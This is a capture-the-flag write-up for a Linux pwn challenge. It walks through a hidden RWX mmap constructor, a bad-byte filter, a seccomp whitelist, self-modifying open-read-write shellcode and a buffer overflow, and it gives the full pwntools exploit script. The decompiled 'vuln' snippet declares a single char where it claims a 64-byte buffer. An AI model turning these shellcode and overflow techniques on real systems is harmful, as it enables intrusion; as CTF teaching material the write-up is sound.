# CTF Writeup: sh3llc0d3r

**Category:** Pwn
**Difficulty:** Medium / Hard

---

## Challenge Overview

`sh3llc0d3r` is a Linux exploitation challenge that forces us to combine several techniques: reverse engineering hidden initializers, bypassing strict bad-byte filters, defeating a Seccomp sandbox, and writing custom self-modifying shellcode (SMC).

---

## 1. Initial Analysis

Before diving into the binary, we check the standard protections using `checksec`:

> [ Insert screenshot of checksec output here ]

**Protections:**

- **Arch:** amd64
- **NX:** Enabled (Stack is not executable)
- **PIE:** Disabled (Addresses in the binary are static)
- **Canary:** Disabled (Buffer overflows are trivial)

The binary runs, asks for an answer size, takes our input, and then exits if we don't provide the right payload.

---

## 2. Reverse Engineering

### The `main` Function & The Missing Page

Opening the binary in a decompiler (like Ghidra or IDA) or examining it in GDB reveals a strange behavior in `main()`.

The program asks for a length, and then calls `read()` to place our input directly into a hardcoded memory address: `0x1337000`.

```c
// Decompiled snippet from main()
read(0, (void *)0x1337000, sc_len);
```

> [ Insert screenshot of Ghidra/IDA decompilation of main() showing the read to 0x1337000 ]

At first glance, returning to `0x1337000` should cause a Segmentation Fault because there is no obvious `mmap` call in `main()` allocating this page. However, looking closer at the binary's functions, we find a hidden setup phase.

### The Hidden Constructor

By checking the binary's constructors or the `.init_array`, we find a strangely named function: `__libc_setup_tls`.

> [ Insert screenshot of GDB "info functions" or Ghidra showing `__libc_setup_tls` ]

Despite its boring name, this function is actually annotated with `__attribute__((constructor))`, meaning it executes **before** `main()`. Inside, we find the real secret:

```c
void __libc_setup_tls(void) {
    mmap((void *)0x1337000, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, ...);
}
```

The program **does** allocate an RWX (Read-Write-Execute) page at `0x1337000`! This is where our shellcode will live.

### The Bad Byte Filter

After reading our input, `main()` passes our payload to `check_bad_bytes()`. Disassembling this function shows it explicitly bans three bytes:

- `0x00` (Null byte)
- `0x0a` (Newline)
- `0x0f` (The first byte of the `syscall` instruction `0x0f 0x05`)

### The Seccomp Sandbox

Finally, the program calls `install_seccomp()`. Dumping the rules (using `seccomp-tools`) reveals a strict whitelist:

- `open` (2) / `openat` (257)
- `read` (0)
- `write` (1)
- `exit` (60) / `exit_group` (231)

`execve` is **blocked**, meaning we cannot just spawn `/bin/sh`. We must write an **Open-Read-Write (ORW)** chain.

---

## 3. Exploit Strategy

To capture the flag, we need to bypass all the protections in three steps:

### Step 1: Defeating the `0x0f` Filter (Self-Modifying Code)

Because `0x0f` is banned, we cannot write a literal `syscall` instruction. Since our shellcode is placed in an **RWX** page, we can use **Self-Modifying Code (SMC)**.

Instead of `0x0f 0x05`, we write `0x0e 0x05`. Right before we need to execute the syscall, we increment the `0x0e` byte in memory so it becomes `0x0f`.

To do this without using null bytes for offsets, we use a `call/pop` trick to dynamically get the address of our target instruction:

```asm
    jmp get_rip
modify:
    pop rbx              ; rbx now holds the exact address of 'target'
    inc byte ptr [rbx]   ; Changes 0x0e to 0x0f without null bytes
    jmp rbx              ; Jumps to our newly minted syscall
get_rip:
    call modify          ; Pushes the address of 'target' to the stack
target:
    .byte 0x0e, 0x05     ; Becomes 0x0f 0x05 at runtime
```

### Step 2: The ORW Chain

Using the SMC trick above, we will structure our shellcode to:

1. Open `flag.txt`
2. Read its contents onto the stack
3. Write the stack contents to stdout

### Step 3: Hijacking Execution (vuln Buffer Overflow)

After the shellcode is loaded and verified, the program calls `vuln()`.

```c
void vuln(void) {
    char buf;
    read(0, buf, 200);
}
```

This is a classic **buffer overflow**. We will overflow the 64-byte buffer, overwrite the saved RBP (8 bytes), and overwrite the saved Return Address (RIP) with `0x1337000`, jumping straight into our staged shellcode.

> [ Insert screenshot of the buffer overflow taking place in GDB, showing the overwritten RIP ]

---

## 4. Full Exploit Script

Here is the final `pwntools` Python script used to solve the challenge:

```python
from pwn import *

context.arch = 'amd64'

# Start the process (Change to remote('IP', PORT) for remote testing)
io = process('./vuln')

# Helper function to generate our null-free syscall gadget
def safe_syscall(idx):
    return f'''
        jmp get_rip_{idx}
    modify_{idx}:
        pop rbx
        inc byte ptr [rbx]
        jmp rbx
    get_rip_{idx}:
        call modify_{idx}
    target_{idx}:
        .byte 0x0e, 0x05
    '''

# Craft the strictly bad-byte-free ORW Shellcode
shellcode_src = f'''
    /* 1. open("flag.txt", O_RDONLY) */
    xor rax, rax          /* Safely create null bytes */
    push rax              /* Push null-terminator for the string */
    mov rax, 0x7478742e67616c66
    push rax              /* Push "flag.txt" */
    mov rdi, rsp          /* rdi points to our null-terminated string */
    xor rsi, rsi          /* rsi = 0 (O_RDONLY) */
    push 2
    pop rax               /* rax = 2 (sys_open) */
    {safe_syscall(1)}

    /* 2. read(fd, rsp, 0x50) */
    mov rdi, rax          /* Move the returned file descriptor into rdi */
    mov rsi, rsp          /* Read directly onto the stack */
    push 0x50
    pop rdx               /* Read up to 80 bytes */
    xor rax, rax          /* rax = 0 (sys_read) */
    {safe_syscall(2)}

    /* 3. write(1, rsp, bytes_read) */
    mov rdx, rax          /* rax contains bytes successfully read */
    push 1
    pop rdi               /* rdi = 1 (stdout) */
    push 1
    pop rax               /* rax = 1 (sys_write) */
    {safe_syscall(3)}
'''

shellcode = asm(shellcode_src)

log.success(f"Shellcode compiled successfully! Size: {len(shellcode)} bytes")

# Step 1: Send the shellcode size, then the shellcode itself
io.sendlineafter(b'>: ', str(len(shellcode)).encode())
io.send(shellcode)

# Step 2: Trigger the Buffer Overflow in vuln()
padding   = b"A" * 64
saved_rbp = b"B" * 8
ret_addr  = p64(0x1337000)

payload = padding + saved_rbp + ret_addr

# Wait briefly for vuln() to prompt, then send the overflow payload
sleep(0.5)
io.sendline(payload)

# Receive the flag
io.interactive()
```

---

## 5. Execution

Running the script against the target dynamically constructs the shellcode, bypasses the filter, safely pops our hidden RWX page address into the instruction pointer, and prints the flag!

> [ Insert final screenshot of the terminal showing the script executing and printing the FLAG ]

**FLAG{sh3llc0d3r_go_brrrr}**
